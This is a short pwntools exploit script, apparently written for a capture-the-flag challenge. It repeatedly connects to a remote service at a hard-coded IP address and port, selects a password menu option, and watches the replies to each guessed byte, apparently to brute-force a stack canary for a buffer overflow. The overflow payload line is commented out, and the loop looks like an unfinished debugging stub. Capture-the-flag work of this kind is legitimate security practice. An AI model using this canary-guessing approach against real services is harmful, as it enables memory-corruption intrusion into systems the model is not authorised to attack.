from pwn import *
# context.log_level='debug'
canary=b''
for i in range(200,0x100):
    p=remote('47.94.206.10',26041)
    p.recvuntil(b'> ')
    p.sendline(b'2')
    p.recvuntil(b'PASSWD: ')
    print(i)
    if i!=9:
        # p.send(b'a'*0x18+p8(i))
        recv=p.recvuntil(b'PASSWD',timeout=0.25)
        # p.interactive()
        if b'PASSWD' in recv:
            print("success",hex(i))
